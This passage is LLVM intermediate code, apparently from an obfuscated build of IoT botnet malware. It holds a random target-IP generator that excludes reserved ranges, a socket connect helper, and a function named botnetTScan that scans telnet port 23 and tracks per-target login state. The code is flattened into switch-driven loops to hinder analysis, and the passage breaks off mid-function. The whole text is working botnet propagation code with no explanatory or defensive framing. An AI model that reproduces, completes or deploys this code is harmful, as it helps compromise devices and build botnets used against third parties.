  %2855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2856 = zext i8 %2855 to i32
  %2857 = icmp eq i32 %2856, 164
  %2858 = select i1 %2857, i32 -1813357520, i32 1196575377
  store i32 %2858, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2859:                                   ; preds = %loopEntry
  %2860 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2861 = zext i8 %2860 to i32
  %2862 = icmp eq i32 %2861, 120
  %2863 = select i1 %2862, i32 514470986, i32 -455889164
  store i32 %2863, i32* %switchVar
  br label %loopEnd

; <label>:2864:                                   ; preds = %loopEntry
  %2865 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2866 = zext i8 %2865 to i32
  %2867 = icmp sge i32 %2866, 103
  %2868 = select i1 %2867, i32 1673919261, i32 -455889164
  store i32 %2868, i32* %switchVar
  br label %loopEnd

; <label>:2869:                                   ; preds = %loopEntry
  %2870 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2871 = zext i8 %2870 to i32
  %2872 = icmp slt i32 %2871, 108
  %2873 = select i1 %2872, i32 -1813357520, i32 -455889164
  store i32 %2873, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2874:                                   ; preds = %loopEntry
  %2875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2876 = zext i8 %2875 to i32
  %2877 = icmp eq i32 %2876, 188
  %2878 = select i1 %2877, i32 138132169, i32 -449883600
  store i32 %2878, i32* %switchVar
  br label %loopEnd

; <label>:2879:                                   ; preds = %loopEntry
  %2880 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2881 = zext i8 %2880 to i32
  %2882 = icmp eq i32 %2881, 68
  %2883 = select i1 %2882, i32 -1813357520, i32 -449883600
  store i32 %2883, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2884:                                   ; preds = %loopEntry
  %2885 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2886 = zext i8 %2885 to i32
  %2887 = icmp eq i32 %2886, 78
  %2888 = select i1 %2887, i32 -1976371163, i32 -1869008753
  store i32 %2888, i32* %switchVar
  br label %loopEnd

; <label>:2889:                                   ; preds = %loopEntry
  %2890 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2891 = zext i8 %2890 to i32
  %2892 = icmp eq i32 %2891, 46
  %2893 = select i1 %2892, i32 -1813357520, i32 -1869008753
  store i32 %2893, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2894:                                   ; preds = %loopEntry
  %2895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2896 = zext i8 %2895 to i32
  %2897 = icmp eq i32 %2896, 224
  store i32 -1813357520, i32* %switchVar
  store i1 %2897, i1* %.reg2mem
  br label %loopEnd

; <label>:2898:                                   ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %2899 = select i1 %.reload, i32 485985608, i32 -1365661370
  store i32 %2899, i32* %switchVar
  br label %loopEnd

; <label>:2900:                                   ; preds = %loopEntry
  %2901 = call i32 @rand() #3
  %2902 = srem i32 %2901, 223
  %2903 = trunc i32 %2902 to i8
  store i8 %2903, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2904 = call i32 @rand() #3
  %2905 = srem i32 %2904, 255
  %2906 = trunc i32 %2905 to i8
  store i8 %2906, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2907 = call i32 @rand() #3
  %2908 = srem i32 %2907, 255
  %2909 = trunc i32 %2908 to i8
  store i8 %2909, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2910 = call i32 @rand() #3
  %2911 = srem i32 %2910, 255
  %2912 = trunc i32 %2911 to i8
  store i8 %2912, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  store i32 302883027, i32* %switchVar
  br label %loopEnd

; <label>:2913:                                   ; preds = %loopEntry
  %2914 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %2914, i8 0, i64 16, i32 16, i1 false)
  %2915 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %2916 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2917 = zext i8 %2916 to i32
  %2918 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2919 = zext i8 %2918 to i32
  %2920 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2921 = zext i8 %2920 to i32
  %2922 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %2923 = zext i8 %2922 to i32
  %2924 = call i32 (i8*, i8*, ...) @szprintf(i8* %2915, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.99, i32 0, i32 0), i32 %2917, i32 %2919, i32 %2921, i32 %2923)
  %2925 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %2926 = call i32 @inet_addr(i8* %2925) #3
  ret i32 %2926

loopEnd:                                          ; preds = %2900, %2898, %2894, %2889, %2884, %2879, %2874, %2869, %2864, %2859, %2854, %2849, %2844, %2839, %2834, %2829, %2824, %2819, %2814, %2809, %2804, %2799, %2794, %2789, %2784, %2779, %2774, %2769, %2764, %2759, %2754, %2749, %2744, %2739, %2734, %2729, %2724, %2719, %2714, %2709, %2704, %2699, %2694, %2689, %2684, %2679, %2674, %2669, %2664, %2659, %2654, %2649, %2644, %2639, %2634, %2629, %2624, %2619, %2614, %2609, %2604, %2599, %2594, %2589, %2584, %2579, %2574, %2569, %2564, %2559, %2554, %2549, %2544, %2539, %2534, %2529, %2524, %2519, %2514, %2509, %2504, %2499, %2494, %2489, %2484, %2479, %2474, %2469, %2464, %2459, %2454, %2449, %2444, %2439, %2434, %2429, %2424, %2419, %2414, %2409, %2404, %2399, %2394, %2389, %2384, %2379, %2374, %2369, %2364, %2359, %2354, %2349, %2344, %2339, %2334, %2329, %2324, %2319, %2314, %2309, %2304, %2299, %2294, %2289, %2284, %2279, %2274, %2269, %2264, %2259, %2254, %2249, %2244, %2239, %2234, %2229, %2224, %2219, %2214, %2209, %2204, %2199, %2194, %2189, %2184, %2179, %2174, %2169, %2164, %2159, %2154, %2149, %2144, %2139, %2134, %2129, %2124, %2119, %2114, %2109, %2104, %2099, %2094, %2089, %2084, %2079, %2074, %2069, %2064, %2059, %2054, %2049, %2044, %2039, %2034, %2029, %2024, %2019, %2014, %2009, %2004, %1999, %1994, %1989, %1984, %1979, %1974, %1969, %1964, %1959, %1954, %1949, %1944, %1939, %1934, %1929, %1924, %1919, %1914, %1909, %1904, %1899, %1894, %1889, %1884, %1879, %1874, %1869, %1864, %1859, %1854, %1849, %1844, %1839, %1834, %1829, %1824, %1819, %1814, %1809, %1804, %1799, %1794, %1789, %1784, %1779, %1774, %1769, %1764, %1759, %1754, %1749, %1744, %1739, %1734, %1729, %1724, %1719, %1714, %1709, %1704, %1699, %1694, %1689, %1684, %1679, %1674, %1669, %1664, %1659, %1654, %1649, %1644, %1639, %1634, %1629, %1624, %1619, %1614, %1609, %1604, %1599, %1594, %1589, %1584, %1579, %1574, %1569, %1564, %1559, %1554, %1549, %1544, %1539, %1534, %1529, %1524, %1519, %1514, %1509, %1504, %1499, %1494, %1489, %1484, %1479, %1474, %1469, %1464, %1459, %1454, %1449, %1444, %1439, %1434, %1429, %1424, %1419, %1414, %1409, %1404, %1399, %1394, %1389, %1384, %1379, %1374, %1369, %1364, %1359, %1354, %1349, %1344, %1339, %1334, %1329, %1324, %1319, %1314, %1309, %1304, %1299, %1294, %1289, %1284, %1279, %1274, %1269, %1264, %1259, %1254, %1249, %1244, %1239, %1234, %1229, %1224, %1219, %1214, %1209, %1204, %1199, %1194, %1189, %1184, %1179, %1174, %1169, %1164, %1159, %1154, %1149, %1144, %1139, %1134, %1129, %1124, %1119, %1114, %1109, %1104, %1099, %1094, %1089, %1084, %1079, %1074, %1069, %1064, %1059, %1054, %1049, %1044, %1039, %1034, %1029, %1024, %1019, %1014, %1009, %1004, %999, %994, %989, %984, %979, %974, %969, %964, %959, %954, %949, %944, %939, %934, %929, %924, %919, %914, %909, %904, %899, %894, %889, %884, %879, %874, %869, %864, %859, %854, %849, %844, %839, %834, %829, %824, %819, %814, %809, %804, %799, %794, %789, %784, %779, %774, %769, %764, %759, %754, %749, %744, %739, %734, %729, %724, %719, %714, %709, %704, %699, %694, %689, %684, %679, %674, %669, %664, %659, %654, %649, %644, %639, %634, %629, %624, %619, %614, %609, %604, %599, %594, %589, %584, %579, %574, %569, %564, %559, %554, %549, %544, %539, %534, %529, %524, %519, %514, %509, %504, %499, %494, %489, %484, %479, %474, %469, %464, %459, %454, %449, %444, %439, %434, %429, %424, %419, %414, %409, %404, %399, %394, %389, %384, %379, %374, %369, %364, %359, %354, %349, %344, %339, %334, %329, %324, %319, %314, %309, %304, %299, %294, %289, %284, %279, %274, %269, %264, %259, %254, %249, %244, %239, %234, %229, %224, %219, %214, %209, %204, %199, %194, %189, %184, %179, %174, %169, %164, %159, %154, %149, %144, %139, %134, %129, %124, %119, %114, %109, %104, %99, %94, %89, %84, %79, %74, %69, %64, %59, %54, %49, %44, %39, %34, %29, %24, %19, %14, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define i32 @GRIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 -1441311553, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1441311553, label %first
    i32 1300005878, label %14
    i32 562323404, label %15
    i32 -1040098238, label %38
    i32 -1398249632, label %39
    i32 -1393860631, label %45
    i32 -1485157119, label %46
    i32 1190915809, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %12 = icmp eq %struct.hostent* %.reload, null
  %13 = select i1 %12, i32 1300005878, i32 562323404
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1190915809, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.hostent*, %struct.hostent** %6, align 8
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %16, i32 0, i32 4
  %18 = load i8**, i8*** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %22 = bitcast %struct.in_addr* %21 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 3
  %25 = load i32, i32* %24, align 4
  %26 = sext i32 %25 to i64
  call void @bcopy(i8* %20, i8* %22, i64 %26) #3
  %27 = load i16, i16* %5, align 2
  %28 = call zeroext i16 @htons(i16 zeroext %27) #10
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = call i32 @socket(i32 2, i32 1, i32 6) #3
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = bitcast i32* %8 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 6, i32 1, i8* %33, i32 4) #3
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 -1040098238, i32 -1398249632
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1190915809, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 -1393860631, i32 -1485157119
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1190915809, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %3, align 4
  store i32 1190915809, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %3, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %39, %38, %15, %14, %first, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @botnetTScan(i32, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %11, align 4
  %24 = call i64 @time(i64* null) #3
  %25 = call i32 @rand_cmwc()
  %26 = zext i32 %25 to i64
  %27 = xor i64 %24, %26
  %28 = trunc i64 %27 to i32
  call void @srand(i32 %28) #3
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 23) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %33 = getelementptr inbounds [8 x i8], [8 x i8]* %32, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 8, i32 4, i1 false)
  %34 = call noalias i8* @malloc(i64 1025) #3
  store i8* %34, i8** %17, align 8
  %35 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 1025, i32 1, i1 false)
  %36 = load i32, i32* %11, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %19, align 8
  %39 = alloca %struct.telstate_t, i64 %37, align 16
  %40 = bitcast %struct.telstate_t* %39 to i8*
  %41 = load i32, i32* %11, align 4
  %42 = sext i32 %41 to i64
  %43 = mul i64 %42, 5
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 %43, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -844048146, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar15 = load i32, i32* %switchVar
  switch i32 %switchVar15, label %switchDefault [
    i32 -844048146, label %44
    i32 17421617, label %49
    i32 2126515276, label %63
    i32 -1513560378, label %66
    i32 147566091, label %67
    i32 1707846893, label %75
    i32 1618786343, label %76
    i32 745255481, label %77
    i32 1713910132, label %78
    i32 540009504, label %79
    i32 -134993965, label %84
    i32 1055878514, label %92
    i32 689568431, label %99
    i32 1487250664, label %NodeBlock13
    i32 -513870158, label %NodeBlock11
    i32 307852911, label %NodeBlock9
    i32 79402712, label %LeafBlock7
    i32 1606222914, label %NodeBlock5
    i32 -1412685034, label %NodeBlock3
    i32 -749218585, label %NodeBlock1
    i32 1019812020, label %NodeBlock
    i32 1104955325, label %LeafBlock
    i32 777573991, label %115
    i32 1167422293, label %124
    i32 -1084907932, label %144
    i32 -1303401309, label %153
    i32 -384998990, label %174
    i32 1952153635, label %179
    i32 -425376182, label %188
    i32 -818990031, label %193
    i32 1513109213, label %194
    i32 -1117724451, label %195
    i32 -1112266168, label %220
    i32 1831795472, label %221
    i32 1867745371, label %244
    i32 1569189943, label %249
    i32 137011866, label %253
    i32 -1112797623, label %257
    i32 1134567720, label %258
    i32 -1164233070, label %259
    i32 15396269, label %268
    i32 450290963, label %269
    i32 -1821006428, label %303
    i32 941277149, label %314
    i32 1988345255, label %318
    i32 2089664464, label %335
    i32 -2004964955, label %336
    i32 -1825513865, label %340
    i32 671673328, label %344
    i32 1646417849, label %345
    i32 1177511162, label %356
    i32 2100977498, label %360
    i32 -2097201321, label %361
    i32 1478999760, label %376
    i32 -886549431, label %385
    i32 -902399087, label %389
    i32 1323319194, label %393
    i32 989169139, label %394
    i32 -216167361, label %405
    i32 563739119, label %409
    i32 -1736704690, label %410
    i32 -963047214, label %436
    i32 1877410165, label %440
    i32 453506383, label %449
    i32 -595236254, label %453
    i32 706815471, label %457
    i32 -1112664149, label %472
    i32 -444354409, label %481
    i32 1082085324, label %485
    i32 -800284386, label %489
    i32 1092367214, label %490
    i32 1186288913, label %501
    i32 1285562324, label %505
    i32 1738867887, label %506
    i32 1385510452, label %532
    i32 1002542915, label %536
    i32 -813262921, label %545
    i32 -1512850597, label %549
    i32 -1437151952, label %553
    i32 -532722634, label %568
    i32 -1897402905, label %583
    i32 -144204513, label %587
    i32 -1074564614, label %596
    i32 263600171, label %605
    i32 -226445591, label %609
    i32 -726211592, label %635
    i32 1141042713, label %636
    i32 -85153291, label %640
    i32 1231171563, label %641
    i32 18591303, label %642
    i32 595740037, label %653
    i32 1681433307, label %657
    i32 -1870336386, label %658
    i32 -1898898067, label %673
    i32 1269202977, label %674
    i32 -1990221057, label %683
    i32 103373348, label %684
    i32 -547569719, label %696
    i32 529136452, label %700
    i32 -1895973637, label %711
    i32 1313224925, label %720
    i32 -753185817, label %721
    i32 -1200132043, label %725
    i32 1611446021, label %NewDefault
    i32 -993238654, label %726
    i32 -623792744, label %727
    i32 -1411074435, label %730
    i32 -35812400, label %731
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %5, align 4
  %46 = load i32, i32* %11, align 4
  %47 = icmp slt i32 %45, %46
  %48 = select i1 %47, i32 17421617, i32 -1513560378
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %5, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %51
  %53 = bitcast %struct.telstate_t* %52 to i8*
  call void @llvm.memset.p0i8.i64(i8* %53, i8 0, i64 32, i32 16, i1 false)
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %55
  %57 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %56, i32 0, i32 3
  store i8 1, i8* %57, align 1
  %58 = load i8*, i8** %17, align 8
  %59 = load i32, i32* %5, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %60
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %61, i32 0, i32 9
  store i8* %58, i8** %62, align 8
  store i32 2126515276, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %5, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %5, align 4
  store i32 -844048146, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 147566091, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %7, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %7, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %70
  %72 = load i8*, i8** %71, align 8
  %73 = icmp ne i8* %72, null
  %74 = select i1 %73, i32 1707846893, i32 1618786343
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  store i32 147566091, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  store i32 745255481, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 1713910132, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 540009504, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %5, align 4
  %81 = load i32, i32* %11, align 4
  %82 = icmp slt i32 %80, %81
  %83 = select i1 %82, i32 -134993965, i32 -1411074435
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %5, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %86
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %87, i32 0, i32 7
  %89 = load i32, i32* %88, align 16
  %90 = icmp eq i32 %89, 0
  %91 = select i1 %90, i32 1055878514, i32 689568431
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = call i64 @time(i64* null) #3
  %94 = trunc i64 %93 to i32
  %95 = load i32, i32* %5, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %96
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %97, i32 0, i32 7
  store i32 %94, i32* %98, align 16
  store i32 689568431, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %101
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %102, i32 0, i32 2
  %104 = load i8, i8* %103, align 8
  %105 = zext i8 %104 to i32
  store i32 %105, i32* %.reg2mem
  store i32 1487250664, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload23 = load volatile i32, i32* %.reg2mem
  %Pivot14 = icmp slt i32 %.reload23, 4
  %106 = select i1 %Pivot14, i32 -1412685034, i32 -513870158
  store i32 %106, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload18 = load volatile i32, i32* %.reg2mem
  %Pivot12 = icmp slt i32 %.reload18, 6
  %107 = select i1 %Pivot12, i32 1606222914, i32 307852911
  store i32 %107, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload16 = load volatile i32, i32* %.reg2mem
  %Pivot10 = icmp slt i32 %.reload16, 7
  %108 = select i1 %Pivot10, i32 -1437151952, i32 79402712
  store i32 %108, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf8 = icmp eq i32 %.reload, 7
  %109 = select i1 %SwitchLeaf8, i32 -1870336386, i32 1611446021
  store i32 %109, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload17 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload17, 5
  %110 = select i1 %Pivot6, i32 706815471, i32 1738867887
  store i32 %110, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload22 = load volatile i32, i32* %.reg2mem
  %Pivot4 = icmp slt i32 %.reload22, 2
  %111 = select i1 %Pivot4, i32 1019812020, i32 -749218585
  store i32 %111, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload19 = load volatile i32, i32* %.reg2mem
  %Pivot2 = icmp slt i32 %.reload19, 3
  %112 = select i1 %Pivot2, i32 -2097201321, i32 -1736704690
  store i32 %112, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload21 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload21, 1
  %113 = select i1 %Pivot, i32 1104955325, i32 1134567720
  store i32 %113, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload20 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload20, 0
  %114 = select i1 %SwitchLeaf, i32 777573991, i32 1611446021
  store i32 %114, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i32, i32* %5, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 3
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 1
  %123 = select i1 %122, i32 1167422293, i32 -1084907932
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i32, i32* %5, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 9
  %129 = load i8*, i8** %128, align 8
  store i8* %129, i8** %20, align 8
  %130 = load i32, i32* %5, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %131
  %133 = bitcast %struct.telstate_t* %132 to i8*
  call void @llvm.memset.p0i8.i64(i8* %133, i8 0, i64 32, i32 16, i1 false)
  %134 = load i8*, i8** %20, align 8
  %135 = load i32, i32* %5, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %136
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %137, i32 0, i32 9
  store i8* %134, i8** %138, align 8
  %139 = call i32 @GIP()
  %140 = load i32, i32* %5, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 1
  store i32 %139, i32* %143, align 4
  store i32 -1117724451, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i32, i32* %5, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %146
